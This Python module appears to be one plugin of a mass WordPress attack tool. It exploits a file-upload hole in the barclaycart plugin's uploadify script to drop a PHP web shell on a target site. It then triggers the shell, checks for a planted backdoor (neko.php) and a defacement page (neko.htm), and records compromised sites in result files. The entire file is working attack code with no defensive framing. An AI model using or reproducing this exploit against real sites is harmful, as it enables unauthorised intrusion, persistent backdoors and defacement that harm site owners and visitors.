# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
pagelinesExploitShell = 'files/settings_auto.php'


def Exploit(site):
    try:
        ShellFile = {'Filedata': (pagelinesExploitShell, open(pagelinesExploitShell, 'rb')
                                  , 'multipart/form-data')}
        Exp = 'http://' + site + '/wp-content/plugins/barclaycart/uploadify/uploadify.php'
        requests.post(Exp, files=ShellFile, timeout=10, headers=Headers)
        Shell = 'http://' + site + '/wp-content/plugins/barclaycart/uploadify/' \
                + pagelinesExploitShell.split('/')[1]
        GoT = requests.get(Shell, timeout=10, headers=Headers)
        if GoT.status_code == 200:
            CheckShell = requests.get('http://' + site + '/wp-content/neko.php', timeout=10, headers=Headers)
            CheckIndex = requests.get('http://' + site + '/neko.htm', timeout=10, headers=Headers)
            if 'neko!!' in CheckShell.content:
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write(site + '/wp-content/neko.php' + '\n')
            if 'neko!!' in CheckIndex.content:
                with open('result/Index_results.txt', 'a') as writer:
                    writer.write(site + '/neko.htm' + '\n')
                return printModule.returnYes(site, 'N/A', 'barclaycart Plugin', 'Wordpress')
            else:
                return printModule.returnNo(site, 'N/A', 'barclaycart Plugin', 'Wordpress')
        else:
            return printModule.returnNo(site, 'N/A', 'barclaycart Plugin', 'Wordpress')
    except:
        return printModule.returnNo(site, 'N/A', 'barclaycart Plugin', 'Wordpress')
